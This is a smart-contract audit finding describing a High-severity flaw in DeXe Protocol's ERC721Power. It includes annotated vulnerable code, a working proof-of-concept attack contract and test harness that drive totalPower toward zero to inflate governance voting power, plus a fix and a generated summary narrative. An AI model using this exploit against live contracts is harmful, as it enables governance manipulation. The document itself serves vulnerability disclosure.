---
id: 19500
severity: "High"
---

# Attacker can at anytime dramatically lower `ERC721Power::totalPower` close to 0

## Description

Attacker can at anytime dramatically lower `ERC721Power::totalPower` close to 0 using a permission-less attack contract by taking advantage of being able to call `ERC721Power::recalculateNftPower()` & `getNftPower()` for non-existent nfts:

```solidity
function getNftPower(uint256 tokenId) public view override returns (uint256) {
    if (block.timestamp <= powerCalcStartTimestamp) {
        return 0;
    }

    // @audit 0 for non-existent tokenId
    uint256 collateral = nftInfos[tokenId].currentCollateral;

    // Calculate the minimum possible power based on the collateral of the nft
    // @audit returns default maxPower for non-existent tokenId
    uint256 maxNftPower = getMaxPowerForNft(tokenId);
    uint256 minNftPower = maxNftPower.ratio(collateral, getRequiredCollateralForNft(tokenId));
    minNftPower = maxNftPower.min(minNftPower);

    // Get last update and current power. Or set them to default if it is first iteration
    // @audit both 0 for non-existent tokenId
    uint64 lastUpdate = nftInfos[tokenId].lastUpdate;
    uint256 currentPower = nftInfos[tokenId].currentPower;

    if (lastUpdate == 0) {
        lastUpdate = powerCalcStartTimestamp;
        // @audit currentPower set to maxNftPower which
        // is just the default maxPower even for non-existent tokenId!
        currentPower = maxNftPower;
    }

    // Calculate reduction amount
    uint256 powerReductionPercent = reductionPercent * (block.timestamp - lastUpdate);
    uint256 powerReduction = currentPower.min(maxNftPower.percentage(powerReductionPercent));
    uint256 newPotentialPower = currentPower - powerReduction;

    // @audit returns newPotentialPower slightly reduced
    // from maxPower for non-existent tokenId
    if (minNftPower <= newPotentialPower) {
        return newPotentialPower;
    }

    if (minNftPower <= currentPower) {
        return minNftPower;
    }

    return currentPower;
}

function recalculateNftPower(uint256 tokenId) public override returns (uint256 newPower) {
    if (block.timestamp < powerCalcStartTimestamp) {
        return 0;
    }

    // @audit newPower > 0 for non-existent tokenId
    newPower = getNftPower(tokenId);

    NftInfo storage nftInfo = nftInfos[tokenId];

    // @audit as this is the first update since
    // tokenId doesn't exist, totalPower will be
    // subtracted by nft's max power
    totalPower -= nftInfo.lastUpdate != 0 ? nftInfo.currentPower : getMaxPowerForNft(tokenId);
    // @audit then totalPower is increased by newPower where:
    // 0 < newPower < maxPower hence net decrease to totalPower
    totalPower += newPower;

    nftInfo.lastUpdate = uint64(block.timestamp);
    nftInfo.currentPower = newPower;
}
```

`ERC721Power::totalPower` lowered to near 0. This can be used to artificially increase voting power since [`totalPower` is read when creating the snapshot](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L330-L331) and is used as [the divisor in `GovUserKeeper::getNftsPowerInTokensBySnapshot()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L559).

This attack is pretty devastating as `ERC721Power::totalPower` can never be increased since the `currentPower` of individual nfts can only ever be decreased; there is no way to "undo" this attack unless the nft contract is replaced with a new contract.

## Proof of Concept

Add attack contract `mock/utils/ERC721PowerAttack.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../../gov/ERC721/ERC721Power.sol";

import "hardhat/console.sol";

contract ERC721PowerAttack {
    // this attack can decrease ERC721Power::totalPower close to 0
    //
    // this attack works when block.timestamp > nftPower.powerCalcStartTimestamp
    // by taking advantage calling recalculateNftPower for non-existent nfts
    function attack2(
        address nftPowerAddr,
        uint256 initialTotalPower,
        uint256 lastTokenId,
        uint256 attackIterations
    ) external {
        ERC721Power nftPower = ERC721Power(nftPowerAddr);

        // verify attack starts on the correct block
        require(
            block.timestamp > nftPower.powerCalcStartTimestamp(),
            "ERC721PowerAttack: attack2 requires block.timestamp > nftPower.powerCalcStartTimestamp"
        );

        // verify totalPower() correct at starting block
        require(
            nftPower.totalPower() == initialTotalPower,
            "ERC721PowerAttack: incorrect initial totalPower"
        );

        // output totalPower before attack
        console.log(nftPower.totalPower());

        // keep calling recalculateNftPower() for non-existent nfts
        // this lowers ERC721Power::totalPower() every time
        // can't get it to 0 due to underflow but can get close enough
        for (uint256 i; i < attackIterations; ) {
            nftPower.recalculateNftPower(++lastTokenId);
            unchecked {
                ++i;
            }
        }

        // output totalPower after attack
        console.log(nftPower.totalPower());

        // original totalPower : 10000000000000000000000000000
        // current  totalPower : 900000000000000000000000000
        require(
            nftPower.totalPower() == 900000000000000000000000000,
            "ERC721PowerAttack: after attack finished totalPower should equal 900000000000000000000000000"
        );
    }
}
```

Add test harness to `ERC721Power.test.js`:
```javascript
    describe("audit attacker can manipulate ERC721Power totalPower", () => {
      it("audit attack 2 dramatically lowers ERC721Power totalPower", async () => {
        // deploy the ERC721Power nft contract with:
        // max power of each nft = 100
        // power reduction 10%
        // required collateral = 100
        let maxPowerPerNft = toPercent("100");
        let requiredCollateral = wei("100");
        let powerCalcStartTime = (await getCurrentBlockTime()) + 1000;

        // create power nft contract
        await deployNft(powerCalcStartTime, maxPowerPerNft, toPercent("10"), requiredCollateral);

        // ERC721Power::totalPower should be zero as no nfts yet created
        assert.equal((await nft.totalPower()).toFixed(), toPercent("0").times(1).toFixed());

        // create the attack contract
        const ERC721PowerAttack = artifacts.require("ERC721PowerAttack");
        let attackContract = await ERC721PowerAttack.new();

        // create 10 power nfts for SECOND
        await nft.safeMint(SECOND, 1);
        await nft.safeMint(SECOND, 2);
        await nft.safeMint(SECOND, 3);
        await nft.safeMint(SECOND, 4);
        await nft.safeMint(SECOND, 5);
        await nft.safeMint(SECOND, 6);
        await nft.safeMint(SECOND, 7);
        await nft.safeMint(SECOND, 8);
        await nft.safeMint(SECOND, 9);
        await nft.safeMint(SECOND, 10);

        // verify ERC721Power::totalPower has been increased by max power for all nfts
        assert.equal((await nft.totalPower()).toFixed(), maxPowerPerNft.times(10).toFixed());

        // fast forward time to just after the start of power calculation
        await setTime(powerCalcStartTime);

        // launch the attack
        await attackContract.attack2(nft.address, maxPowerPerNft.times(10).toFixed(), 10, 91);
      });
    });
```

Run attack with: `npx hardhat test --grep "audit attack 2 dramatically lowers ERC721Power totalPower"`

## Recommendation

`ERC721Power::recalculateNftPower()` should revert when called for non-existent nfts.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a permission‑less power‑recalculation routine that can be invoked for token identifiers that have never been minted. The routine assumes a default maximum power for any identifier and then applies a time‑based reduction algorithm. When called for a non‑existent identifier, the contract treats the missing entry as having the maximum power, reduces it slightly, and then updates the global totalPower by subtracting the assumed previous power (the default maximum) and adding the newly calculated reduced value. Because the previous power is taken from a non‑existent record, the net effect is a subtraction from totalPower on each call. An attacker can repeatedly invoke this function with sequential unused identifiers after the power‑calculation start timestamp, causing totalPower to drift downward toward zero. The impact is that totalPower is used as the divisor in governance snapshot calculations, so a lower denominator inflates each holder’s share of voting power. Consequently, an attacker can artificially increase their relative voting weight without owning additional NFTs, potentially steering protocol decisions. The condition for exploitation is simply that the blockchain time is past the configured start time; no ownership, role, or signature checks are required. All token holders, the governance module, and any downstream contracts that rely on the totalPower value are affected because the accounting invariant that totalPower equals the sum of individual NFT powers is broken. The issue was discovered during a security audit that examined edge cases for functions that read NFT state without verifying existence. It is hard to notice because the function appears to only reduce power, and the totalPower value remains positive, so UI components may simply display a lower total without flagging an error. From a user perspective the dashboard may suddenly show the overall voting power dropping dramatically, while the user’s own voting percentage spikes unexpectedly, contradicting the expectation that their share should stay proportional to the number of NFTs they own. The bug belongs to the class of unchecked existence or default‑value misuse in state‑updating functions, leading to accounting distortion. The recommended remediation is to add an explicit existence check in the recalculation routine and revert the transaction when the supplied identifier does not correspond to a minted token, thereby preventing the totalPower from being altered for non‑existent assets.
